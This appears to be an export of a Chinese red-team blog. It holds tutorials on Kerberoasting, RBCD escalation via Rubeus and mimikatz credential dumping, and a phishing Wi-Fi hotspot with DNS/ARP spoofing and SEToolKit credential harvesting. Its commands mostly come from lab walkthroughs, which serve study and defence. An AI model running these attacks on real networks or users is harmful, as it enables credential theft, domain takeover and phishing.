x64(s2):用户tsvc\n```\n\n**所需工具：**\n\n```\nKerberoast工具包\nMimikatz\n```\n\n**攻击流程：**\n\n一、在域内主机s1中通过Kerberoast中的GetUserSPNs.ps1或者GetUserSPNs.vbs进行SPN扫描。\n\n![1575790396105](Kerberos协议探索系列之扫描与爆破篇.assets/1575790396105.png)\n\n![1575790401285](Kerberos协议探索系列之扫描与爆破篇.assets/1575790401285.png)\n\n二、根据扫描出的结果使用微软提供的类KerberosRequestorSecurityToken发起kerberos请求，申请ST票据。\n\nhttps://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?redirectedfrom=MSDN&view=netframework-4.7.2\n\n```powershell\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/s2:1433\" \n```\n\n![1575790432879](Kerberos协议探索系列之扫描与爆破篇.assets/1575790432879.png)\n\n可以看到这个过程通过AS-REQ、AS-REP、TGS-REQ、TGS-REP这四个认证流程，获取到RC4方式加密的票据。\n\n![1575790438443](Kerberos协议探索系列之扫描与爆破篇.assets/1575790438443.png)\n\n三、Kerberos协议中请求的票据会保存在内存中，可以通过klist命令查看当前会话存储的kerberos票据。\n\n![1575790445590](Kerberos协议探索系列之扫描与爆破篇.assets/1575790445590.png)\n\n使用mimikatz导出。\n\n![1575790454000](Kerberos协议探索系列之扫描与爆破篇.assets/1575790454000.png)\n\n![1575790464206](Kerberos协议探索系列之扫描与爆破篇.assets/1575790464206.png)\n\n使用kerberoast工具集中的tgsrepcrack.py工具进行离线爆破，成功得到tsvc账号的密码admin1234!\n\n![1575790470139](Kerberos协议探索系列之扫描与爆破篇.assets/1575790470139.png)\n\n## 2 Kerberoasting的“新姿势”\n\n**实验环境：**\n\n```\n域：YUNYING.LAB\n域控：Windows Server 2008 R2 x64(DC)\n域内主机：Windows 7 x64(s1):用户ts1\n域内主机：Windows Server 2008 R2 x64(s2):用户tsvc\n```\n\n**所需工具：**\n\n```\nInvoke-Kerberoast.ps1\nHashCat\n```\n\n**攻击流程：**\n\n在之前的Kerberoasting中需要通过mimikatz从内存中导出票据，Invoke-Kerberoast通过提取票据传输时的原始字节，转换成John the Ripper或者HashCat能够直接爆破的字符串。环境不变，在s1主机上使用Invoke-Kerberoast脚本(这里使用的是Empire中的Invoke-Kerberoast.ps1)。\n\n```powershell\nInvoke-kerberoast –outputformat hashcat | fl\n```\n\n这里–outputformat参数可以指定输出的格式，可选John the Ripper和Hashcat两种格式，这里以Hashcat做演示。\n\n![1575790508806](Kerberos协议探索系列之扫描与爆破篇.assets/1575790508806.png)\n\n这个脚本申请访问的是MSSQLSvc/s2.yunying.lab:1433这个SPN。查看数据包可以看到Invoke-Kerberoast输出的Hash值就是TGS-REP中返回的票据内容，然后拼接成了Hashcat可以直接爆破的格式（以$krb5tgs$23*开头的）。\n\n![1575790519446](Kerberos协议探索系列之扫描与爆破篇.assets/1575790519446.png)\n\n把内容保存至文档，也可以直接重定向到TXT文件：\n\n```powershell\nInvoke-Kerberoast -Outputformat Hashcat | fl > test1.txt\n```\n\n二、使用HASHCAT工具进行破解：\n\n```\nhashcat64.exe –m 13100 test1.txt password.list --force\n```\n\n![1575790558616](Kerberos协议探索系列之扫描与爆破篇.assets/1575790558616.png)\n\n可以看到这里已经离线破解成功，输出了s2的密码admin1234!。在这里–m表示选择不同的加密类型，其中13100对应的是Kerberos 5 TGS-REP类型的密文。\n\n![1575790566542](Kerberos协议探索系列之扫描与爆破篇.assets/1575790566542.png)\n\n更多的Hashcat的类型可以参考：https://hashcat.net/wiki/doku.php?id=example_hashes\n\n## 3 Invoke-kerberoast的实现\n\n最初进行这个实验的时候是直接在GitHub上搜索的Invoke-kerberoast，当时下载的是https://github.com/malachitheninja/Invoke-Kerberoast这个地址的，但是下载完之后发现这个地址的工具并不能正常使用，查看代码发现在字符串拼接时格式的问题，输出的内容并不符合Hashcat的格式。然后直接使用了Empire中的Invoke-kerberoast.ps1脚本（下载地址：https://github.com/EmpireProject/Empire）。下面就拿这个脚本来说明。\n\n在Invoke-kerberoast中通过两个关键函数看脚本执行的主要流程，一个是function Invoke-Kerberoast {}一个是function Get-DomainSPNTicket {}。\n\n首先在Invoke-Kerberoast函数中通过脚本中的函数Get-DomainUser查询组内所有用户LDAP库中存储的内容，并去除krbtgt之后通过管道符传给Get-DomainSPNTicket。\n\n![1575790576044](Kerberos协议探索系列之扫描与爆破篇.assets/1575790576044.png)\n\nGet-DomainUser输出的值（-erroraction \"Silentlycontinue\"消除powershell中的红字告警，也可以直接去掉）：\n\n![1575790586088](Kerberos协议探索系列之扫描与爆破篇.assets/1575790586088.png)\n\n函数Get-DomainSPNTicket在接收到Get-DomainUser的输出结果后提取SPN（ServicePrincipalName）字段的值，然后取其中的第一个赋值给变量UserSPN。我们在代码中添加echo语句，然后再执行可以看到本次的结果选取了SPN列表中的第一条MSSQLSvc/s2:SQLEXPRESS。\n\n![1575790594038](Kerberos协议探索系列之扫描与爆破篇.assets/1575790594038.png)\n\n![1575790598122](Kerberos协议探索系列之扫描与爆破篇.assets/1575790598122.png)\n\n通过KerberosRequestorSecurityToken类的GetRequest()函数发起kerberos请求。随后通过匹配返回值，提取票据内容。\n\n![1575790604721](Kerberos协议探索系列之扫描与爆破篇.assets/1575790604721.png)\n\n将提取的票据的值组合成Hashcat要求的格式之后赋值给变量HashFormat，也就是最终我们可以用Hashcat或者John the Ripper来爆破的值。\n\n![1575790610905](Kerberos协议探索系列之扫描与爆破篇.assets/1575790610905.png)\n\n同样，上图框中的变量$Etype的值是23，实际上就是RC4加密算法的代号。\n\n![1575790617840](Kerberos协议探索系列之扫描与爆破篇.assets/1575790617840.png)\n\nKerberoasting的本质是通过破解在Kerberos认证流程中的KRB_TGS_REP这个过程中TGS返回给Client的票据内容来进行密码的获取，在一个大型的域中还是有一定的利用价值，并且这种方式是离线爆破，过程较为隐蔽。\n\n# 0x05小结\n\n本文主要说明了kerberos的基本原理以及SPN扫描的内容，介绍了Kerberoasting的攻击手法，Kerberos的原理较为复杂，但是深刻理解之后有助于对于了解其他Kerberos攻击手法是由很大帮助的。同时kerberos在windows的实现中与其他的协议也有一些相关联，多了解一点其他协议也是有必要的。下一篇中我将对MS14068漏洞和银票据金票据的利用和原理进行探究，感谢阅读。\n\n# 实验工具\n\nhttps://github.com/nidem/kerberoast\n\nhttps://github.com/PyroTek3/PowerShell-AD-Recon\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1\n\n# 参考链接\n\nhttps://pentestlab.blog/2018/06/12/kerberoast/\n\nhttp://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/\n\nhttps://skypacer210.github.io/2014/04/09/kerberos-those-thing/\n\nhttps://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#msdn_pac_request\n\nhttps://tools.ietf.org/html/rfc1510","categories":["RedTeam&域安全"]},{"title":"Kerberos_RBCD","url":"/2020/12-18-Kerberos_RBCD/","content":"\n## 简介\n\n基于资源的约束委派（Resource-Based Constrained Delegation）是在Windows Server 2012中新加入的功能。\n\n此前的委派（约束委派和非约束委派）需要通过SPN来支持，需要将SPN注册到msDS-AllowedToDelegateTo属性中。而基于资源的约束委派是通过msDS-AllowedToActOnBehalfOfOtherIdentity，通过设置运行服务的计算机账户或者是服务账户。RBCD的设置是在被访问的一端来设置。被访问的服务可以自己决定谁有权限来访问自身。\n\n## 如何设置RBCD\n\n### RBCD配置\n\nRBCD的设置可以通过命令来进行设置，修改LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity参数来进行设置。如果通过Powershell设置的话再设置之前需要安装Active Directory PowerShell模块，然后将该模块导入会话中：\n\n```powershell\nPS C:\\> Add-WindowsFeature RSAT-AD-PowerShell\nPS C:\\> Import-Module ActiveDirectory\n```\n\n然后有多个cmdlet可以设置PrincipalsAllowedToDelegateToAccount参数：\n\n```powershell\nPS C:\\> Get-Command -ParameterName PrincipalsAllowedToDelegateToAccount\n\nCommandType Name                 ModuleName\n----------- ----                 ----------\nCmdlet      New-ADComputer       ActiveDirectory\nCmdlet      New-ADServiceAccount ActiveDirectory\nCmdlet      New-ADUser           ActiveDirectory\nCmdlet      Set-ADComputer       ActiveDirectory\nCmdlet      Set-ADServiceAccount ActiveDirectory\nCmdlet      Set-ADUser           ActiveDirectory\n```\n\n如果提示没有这些命令则需要安装Active Directory PowerShell模块。\n\n```powershell\nImport-Module  ServerManager ; Add-WindowsFeature RSAT-AD-PowerShell\n```\n\n其中分别对应的是域账户、服务账户、和域中主机。PrincipalsAllowedToDelegateToAccount参数对应的就是LDAP中的参数msDS-AllowedToActOnBehalfOfOtherIdentity。其中包含可指定哪些账户有权限访问自身。也就是需要访问谁，就在谁上面设置中继的账户。\n\n比如要在DC2012主机上设置将自身的委派凭据委派给testrbcd则可以使用命令：\n\n```powershell\nSet-ADComputer dc2012 -PrincipalsAllowedToDelegateToAccount testrbcd$\nGet-ADComputer dc2012 -Properties PrincipalsAllowedToDelegateToAccount #查看结果的\n```\n\n![1571989391101](Kerberos_RBCD.assets/1571989391101.png)\n\n### 其他相关配置\n\n在使用Get-ADComputer(或者是Set-ADComputer等Active Directory PowerShell模块)中设置不同的委派会使用不同的参数。下面几个均为命令中的**参数**。\n\n```\n#无约束委派\nTrustedForDelegation\n#约束委派\nTrustedToAuthForDelegation\n#基于资源的约束委派\nPrincipalsAllowedToDelegateToAccount\n```\n\n而userAccountControl是LDAP中的一个属性(打开ADSI编辑器在对应的属性中即可看到)。\n\n![1572170279746](Kerberos_RBCD.assets/1572170279746.png)\n\n\n\n## RBCD的流程\n\n就像名字所说的，基于资源的约束委派，从流量上来看和约束委派还是差别不大的，首先会经过一个S4u2Self的流程（testrbcd申请能够访问自身的TGS），然后进行S4u2Proxy（申请访问特定SPN的TGS）。\n\n这里的IP：192.168.16.133为发起攻击的主机，192.168.16.132为域控主机（DC2012）。\n\n![1571993548984](Kerberos_RBCD.assets/1571993548984.png)\n\n此时发起攻击的主机获取了能够访问DC2012的cifs服务的TGS票据。\n\n![1572168610408](Kerberos_RBCD.assets/1572168610408.png)\n\n\n\n## RBCD的利用\n\n### NTLMRelay+RBCD的域内提权\n\n此前网上是有各种利用方法的，但是最后实际上都是通过修改LDAP，再发起获取TGS的Kerberos请求，所以先说下基本的流程是什么样的。\n\n1、首先在域控上（有权限配置主机LDAP即可）修改LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity属性（即通过上文所说命令）。其中dc2012为域控主机，testrbcd为域内其他主机（使用https://github.com/Kevin-Robertson/Powermad生成的一个虚拟的主机）。\n\n```powershell\n#Powermad生成主机命令\nPS C:\\>. .\\Powermad.ps1\nPS C:\\>New-MachineAccount -MachineAccount testrbcd\n#执行之后会提示输入密码\n```\n\n```powershell\nSet-ADComputer dc2012 -PrincipalsAllowedToDelegateToAccount testrbcd$\nGet-ADComputer dc2012 -Properties PrincipalsAllowedToDelegateToAccount\n```\n\n![1571993951337](Kerberos_RBCD.assets/1571993951337.png)\n\n2、设置完成之后通过Rubues模拟发起请求。\n\n```powershell\nPS C:\\> .\\Rubeus.exe s4u /user:testrbcd$ /rc4:8bbe95fcb83756d902da7faccd2fa6e1 /domain:test.local /msds\nspn:cifs/dc2012.test.local /impersonateuser:administrator\n#PS C:\\>.\\Rubeus.exe s4u /user:[刚生成的主机名称] /rc4:[生成的主机密码的NTLM HASH值] /domain:[域名] /msds\nspn:[SPN] /impersonateuser:administrator\n```\n\n![1571998711998](Kerberos_RBCD.assets/1571998711998.png)\n\n首先可以看到请求发起之后提示S4U2Self success！此时testrbcd获取到验证自身的TGS票据。\n\n随后获取到能够访问cifs/dc2012.test.local这个SPN的TGS票据。\n\n![1571998916248](Kerberos_RBCD.assets/1571998916248.png)\n\n然后再使用Rubues.exe这个工具就可以把TGS导入到内存中，随后就可以使用dir \\\\\\dc2012\\c$访问域控的C盘。\n\n```powershell\nPS C:\\>.\\Rubeus.exe ptt /ticket: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\n```\n\n实际上在获取了TGS之后，这就是一个PTT（Pass The Ticket）的过程。这个实验是通过手动设置的委派配置，但是个人认为这正是整个攻击过程中最核心的一点，其他通过修改计算机账户头像、SMB请求、Exchange的SSRF等等，最终的目的都是希望通过利用高权限的账户发起NTLM请求，然后中继到LDAP服务器，从而修改委派的配置（LDAP中的msDS-AllowedToActOnBehalfOfOtherIdentity参数）。\n\n### 通过反射进行本地提权\n\n通过设置自身对自身的委派（设置自身属性不需要高权限），然后请求访问自身的高权限TGS。\n\n```powershell\n#设置自己对自己的委派\nSet-ADComputer win2012 -PrincipalsAllowedToDelegateToAccount win2012$\n#查看\nGet-ADComputer win2012 -Properties PrincipalsAllowedToDelegateToAccount\n```\n\n然后开启WINRM服务：\n\n```powershell\nEnable-PSRemoting -Force\n```\n\n使用Rubeus以域管理员身份访问当前计算机的HTTP服务。注意这里的rc4 hash值不能使用本地账号密码的HASH值，要使用主机账户的HASH值。使用mimikatz抓的：\n\n```powershell\n.\\mimikatz.exe \"privilege::Debug\" \"sekurlsa::logonpasswords\" exit\n```\n\n![1572226782759](Kerberos_RBCD.assets/1572226782759.png)\n\n然后使用Rubeus通过委派获取票据。\n\n```powershell\n.\\Rubeus.exe s4u /user:win2012$ /rc4:c2b57f3b6e6ed5eee4b6f8866b814ac5 /domain:test.local /msdsspn:http/win2012.test.local /impersonateuser:administrator\n#导入ticket票据\n.\\Rubeus.exe ptt /ticket:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n```\n\n通过New-PSSession创建新的会话，然后通过Enter-PSSession开启会话。\n\n```\nNew-PSSession -Name priv -ComputerName win2012.test.local\nEnter-PSSession -Name priv\n```\n\n再执行whoami可以看到账户已经改变。\n\n![1572227998459](Kerberos_RBCD.assets/1572227998459.png)\n\n","categories":["RedTeam&域安全"]},{"title":"Hostapd+DNSMASQ创建钓鱼热点","url":"/2020/12-18-Hostapd+DNSMASQ创建钓鱼热点/","content":"\n# 场景\n\n建立钓鱼AP，诱导链接wifi的用户在钓鱼页面上输入账号密码\n\n# 环境说明\n\n系统：笔记本电脑用VMWare起Kali 2020\n网卡：本来是淘宝买的免驱动的RT3070L网卡，后来还是换成了TPLink的WN722，也可以买其他的，需要支持AP模式\n\n# 配置WIFI热点\n\n## 1、无线网卡的配置\n\n### 连接虚拟机\n\n直接插在笔记本上之后选择`虚拟机-->可移动设备-->Ralink网卡-->连接主机`会将无线网卡直接连接到虚拟机上\n\n![image-20201011173304381](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011173304381.png)\n\n### 查看是否支持AP模式\n\n```shell\niw list | grep 'Supported interface modes' -A 10\n#或者直接使用\niw list\n```\n\n![image-20201011174305391](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011174305391.png)\n\n## 2、配置HOSTAPD服务（起WIFI热点）\n\nWIFI是数据链路层的协议，在创建无线热点后，客户端就可以通过无线名及密码连接到该热点并发送数据包。\n\n首先安装hostapd：\n\n```shell\nproxychains apt install hostapd\n# 这里使用的是proxychains挂的代理，要不然安装的时候出问题\n```\n\n修改hostpad.conf配置文件，如果文件不存在就直接创建一个\n\n```\n# 指定无线网卡\ninterface=wlan0\n# 无线网络名\nssid=CORPTTT\n# 无线密码\nwpa_passphrase=12345678\n# 指定驱动\ndriver=nl80211\n# 配置一个WPA-PSK/WPA2-PSK无线热点\nwpa=2\n# 指定信道\nchannel=7\n```\n\n启动hostapd服务\n\n```shell\n# 注意：启动hostapd之前，确保网卡已经启动，否则可能报错\nip link set dev wlan1 up\n\n# 启动服务\nsystemctl start hostapd\n# 或者\nhostapd -B /etc/hostpad/hostapd.conf\n```\n\n此时会启动一个无法联网的WIFI\n\n## 3、网络配置\n\n网络配置有两种方式：一种是桥接模式（通过桥接上网）；一种使NAT模式（通过NAT上网）。二选一即可。\n\n### 配置「桥接」模式\n\n```shell\nbrctl addbr br0 # 创建网桥\nbrctl addif br0 eth0 # 将网卡加入网桥\ndhclient -v br0 # 分配IP地址给网桥接口\n\n# 将无线网卡加入网桥；更具Arch中的描述：不应将无线设备（例如wlan0）添加到网桥；hostapd将自行添加，我反正没明白；\nbrctl addif br0 wlan0\n\n# eth0是连接有线的、可访问外部网络的接口；\n# wlan1是无线AP；\n# 通过将wlan1桥接到eth0，使wlan1可以访问网络。\n```\n\n至此，通过桥接模式，无线就可以访问网络了。\n\n### 配置NAT模式\n\n使用NAT模式可以构建自己的小型局域网。\n\n**配置作为AP的无线网卡**\n\n```shell\n# 这里我们使用172.16.0.0/8网段\nifconfig wlan0 172.16.0.1 netmask 255.255.255.0 up\n```\n\n**配置dnsmasq服务**\n在这里使用Dnsmasq，主要提供DHCP服务的。所以如果没有Dnsmasq也是可以的，但连接到无线之后就要手动配置设备的网络。\n关于Dnsmasq的安装参考另外一篇文章: 在Linux下，Dnsmasq的安装\n\n```\n# 创建/etc/dnsmasq.conf配置文件，写入如下内容\ninterface=wlan1\nlisten-address=172.16.0.1\nno-dhcp-interface=\n\ndhcp-range=172.16.0.2,172.16.0.20,12h\n```\n\n**运行dnsmasq服务**\n\n```shell\nsystemctl start dnsmasq\n\n# 或者手动启动\ndnsmasq -C /etc/dnsmasq.conf\n```\n\n**开启内核「ip_forward」功能**\n\n```shell\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# 写入/etc/sysctl.conf中持久化配置\necho 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf\n```\n\n**配置「NAT」功能**\n\n```shell\n# 172.16.0.0/8：DHCP所使用的网段\n# eth0：是连接到外部网络的接口\niptables -t nat -A POSTROUTING -s 172.16.0.0/16 -o eth0 -j MASQUERADE\n```\n\n至此，NAT模式下，就可以使用CORPTTT这个无线网访问网络了\n\n<img src=\"Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011182858553.png\" alt=\"image-20201011182858553\" style=\"zoom:50%;\" />\n\n可以看到，这里已经获取到了IP地址，如果不设置dnsmasq则无法获取IP地址正常上网。\n\n## 命令汇总：\n\n```shell\nhostapd /opt/wifi/hostapd.conf\n\nifconfig wlan0 172.16.0.1 netmask 255.255.255.0 up\ndnsmasq -C /etc/dnsmasq.conf\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 172.16.0.0/16 -o eth0 -j MASQUERADE\n```\n\n\n\n## 问题汇总\n\n这里在安装的时候是遇到了一些报错：\n\n### hostapd_free_hapd_data: Interface wlan0 wasn't started\n\n![image-20201011183713758](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011183713758.png)\n\n我这边是直接重启Kali就解决的问题，网上还有一些其他的解决方法：\nhttps://k4nz.com/05.Computer_Networks/1.Computer_networking/WLAN_and_Wi-Fi/2.Create_Wi-Fi_Access_Point.html\nhttps://zhuanlan.zhihu.com/p/25875346\n\n```shell\nsystemctl stop network-manager.service\n# 或者在/etc/NetworkManager/NetworkManager.conf中加入\n# 查看网卡mac地址cat /sys/class/net/eth0/address\n[keyfile]\nunmanaged-devices=mac:56:ed:c0:72:ae:ef\n```\n\n还有一种情况是插在转接口上，能读出来网卡，但是会启动不了AP，需要直接插在电脑的USB口上才行\n\n### Operation not possible due to RF-kill\n\n![image-20201011212630850](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011212630850.png)\n\nhttps://bbs.archlinux.org/viewtopic.php?id=173808\n执行：\n\n```shell\nip link set wlan0 up\n\nrfkill unblock all\nrfkill list all\n```\n\n### dnsmasq: failed to bind DHCP server socket: Address already in use\n\n![image-20201011185203619](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011185203619.png)\n\n```\nnetstat -nlp | grep 53\n```\n\n使用命令查看53端口占用即可，我这里已经启动了，所以会被占用，如果是其他DNS服务占用了可以先暂时关闭：\n\n![image-20201011185317427](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201011185317427.png)\n\n直接Kill掉985进程即可使用dnsmasq命令\n\n# 攻击方式\n\n## 配置DNSMASQ的DNS\n\n在dnsmasq.conf中可以修改DNS：\n\n```\naddress=/www.baidu.com/127.0.0.1\n```\n\n![image-20201017122840252](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201017122840252.png)\n\n然后手机连接热点之后再访问百度就可以看到页面是172.16.0.1地址的apache的页面：\n\n![image-20201017123002408](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201017123002408.png)\n\n可以参考：\nhttps://blog.51cto.com/longlei/2065967\n\n修改之后可以做DNS欺骗，伪造钓鱼页面等等\n\n## Ettercap DNS欺骗\n\n首先在/etc/ettercap/etter.dns文件中配置dns解析地址\n\n![image-20201013150545560](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201013150545560.png)\n\n执行`ettercap -G`打开图形界面扫描局域网内主机\n\n![image-20201012214401809](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201012214401809.png)\n\n这里扫描完了点击`Hosts -> HostList`查看扫描结果，但是我这里扫描了很多次都没有办法获取结果\n\n![image-20201012214511840](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201012214511840.png)\n\n可以改成`View -> Resolve IP addresses`查看\n\n![image-20201012214719534](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201012214719534.png)\n\n也可以通过nmap扫描之后手动添加，然后选择选择网关添加到target1，选择目标IP添加到target2(网络上的图)\n\n![image-20201013150835464](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201013150835464.png)\n\n然后`Mitm->ARP posioning->勾选Sniff remote connections`\n\n![image-20201013150932161](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201013150932161.png)\n\n然后点击`Plugins --> dns_spoof`双击选中\n\n![image-20201013150411976](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201013150411976.png)\n\n此时在被欺骗的主机上打开`www.baidu.com`可以发现域名已经被劫持\n\n![image-20201013150651247](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201013150651247.png)\n\n参考链接：https://my.oschina.net/u/4302374/blog/3383337\n\n## Driftnet捕获局域网图像\n\n### 环境\n\n在同一个局域网内，使用的是Kali 2020 (默认没有安装arpspoof和Driftnet)\n\n```shell\napt-get install dsniff ssldump\napt-get install driftnet\n```\n\n### 攻击方式\n\n使用ARP欺骗，172.20.10.11是要攻击的地址\n\n```\narpspoof -i eth0 -t 172.20.10.1 172.20.10.11\n```\n\n![image-20201012130519296](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201012130519296.png)\n\n```\ndriftnet -i eth0\n```\n\n在172.20.10.11中浏览图片时即可看到driftnet记录下了图片\n\n![image-20201012130749777](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201012130749777.png)\n\n如果kali没有进行IP转发  那么目标就会因为配置错网而导致断网\n\n```shell\n开启IP转发:\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n关闭IP转发:\necho 0 > /proc/sys/net/ipv4/ip_forward\n\n查看IP转发是否成功:\ncat /proc/sys/net/ipv4/ip_forward  如果显示1则表示开启成功,显示0则开启失败\n```\n\n# SEToolKit伪造页面\n\n上面说到的两种DNS欺骗的方法实际上需要配合一个比较贴近真实的页面才能达到效果，否则一般情况下不会中招，所以可以使用SEToolKit进行页面复制：\n\n```\nsetoolkit\n```\n\n![Image](Hostapd+DNSMASQ创建钓鱼热点.assets/Image.png)\n\n然后选择 `1-->2-->3-->2`\n\n![Image](Hostapd+DNSMASQ创建钓鱼热点.assets/Image-1602773977388.png)\n\n这里直接Enter下一步\n\n![Image](Hostapd+DNSMASQ创建钓鱼热点.assets/Image-1602774017897.png)\n\n这里会提示输入要clone的url，输入地址然后接连`ENTER`，会在本地起一个80端口，打开就会发现页面和前面的一样\n\n![image-20201015230833841](Hostapd+DNSMASQ创建钓鱼热点.assets/image-20201015230833841.png)\n\n可以构造一些登录页面，诱导用户输入账号密码，SEToolKit会自动抓取请求：\n\n![Image](Hostapd+DNSMASQ创建钓鱼热点.assets/Image-1602774656811.png)\n\n另外静态文件存储在执行命令时的目录中(.set目录)，是隐藏文件夹，同样可以拿出来用在邮件钓鱼等场景中。\n\n![Image](Hostapd+DNSMASQ创建钓鱼热点.assets/Image-1602774698690.png)\n\n实际使用中可以修改一下静态页面，在用户输入账号密码之后将内容重定向到正常页面，这样真实性更高，不容易被发现。","categories":["RedTeam&域安全"]},{"title":"HIDS的一次测试记录","url":"/2020/12-18-HIDS的一次测试记录/","content":"\n## 前言\n\n此前没有接触过HIDS，主要做的是NIDS也就是流量检测方面的内容，手头上拿到了一个刚刚开发的HIDS项目（主要是将一些其他的开源项目拼在了一起，还没开始具体完善），所以做了一些研究和测试，算是比较基础的内容，不过可以借此了解HIDS的构造原理等知识。\n\n## HIDS的简介\n\nHIDS全称是Host-based Intrusion Detection System，即基于主机型入侵检测系统。对应的还有NIDS（Network Intrusion Detection System）网络入侵检测系统。从名称中即可得知，NIDS的主要数据来源是网络流量，而HIDS的主要数据来源是来至于主机本身产生的各种审计信息。主要通过agent收集日志信息进行分析。\n\n下面几个是网上收集的几个HIDS的框架图：\n\n### OSQuery\n\n![img](https://image.3001.net/images/20191217/1576556354_5df857424123b.png!small)\n\n### YSRC 驭龙 HIDS\n\n![img](https://github.com/ysrc/yulong-hids/raw/master/docs/jg.png)\n\n### 美团分布式HIDS\n\n![hids-cluster-architecture](https://p1.meituan.net/travelcube/f7ee684a6ad73e9418451d52576288a3105802.png)\n\n可以看到都是通过agent收集日志，然后开发日志分析规则进行分析。\n\n## 检测原理\n\n### Webshell文件\n\nWebshell主要是结合了网上开源的一些YARA规则对样本进行正则匹配。\n\n### RCE\n\n#### 